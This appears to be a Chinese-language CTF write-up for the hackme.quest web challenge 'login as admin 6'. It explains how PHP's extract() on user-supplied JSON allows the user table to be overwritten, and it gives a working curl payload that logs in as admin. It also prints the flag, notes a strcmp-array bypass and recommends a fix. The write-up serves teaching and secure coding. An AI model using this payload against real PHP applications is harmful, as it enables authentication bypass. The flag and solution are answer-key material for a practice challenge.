# PHM #27 Web — login as admin 6

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 90 |

## 題目

> 連結: [`/login6/`](https://ctf.hackme.quest/login6/)

## 分析

Source:

```php
if(!empty($_POST['data'])) {
    $data = json_decode($_POST['data'], true);
    extract($data);                                          // ← 任意變數覆寫
    if($users[$username] && strcmp($users[$username], $password) == 0) {
        $user = $username;
    }
}
```

`extract($data)` **把 array 的 key 展開成同名變數**, 預設 `EXTR_OVERWRITE`, 會覆蓋現有變數. `$users` 是 config.php 定義的 user 列表, extract 可以直接**整個換掉**.

送:
```json
{"users":{"admin":"pw"}, "username":"admin", "password":"pw"}
```

→ 本地 $users = {admin: "pw"}, $username = "admin", $password = "pw"
→ `$users["admin"]` 存在且 strcmp("pw","pw")==0 → `$user = "admin"` → admin

## 解法

```bash
curl 'https://ctf.hackme.quest/login6/' \
  --data-urlencode 'data={"users":{"admin":"pw"},"username":"admin","password":"pw"}'
```

## Flag

```
FLAG{Oops, I fucked up your user database}
```

## 感想

`extract($_GET)` / `extract(json_decode(...))` 這類是 OWASP top 10 的「Mass Assignment / Insecure Deserialization」交界點. 修法: 永遠加 `EXTR_SKIP` 或 `EXTR_PREFIX_ALL`, 或者就不要用 extract.

另一條路是靠 `strcmp(string, array)` return null (`null == 0` → true) 來 bypass, 但本題直接 overwrite `$users` 更直接.
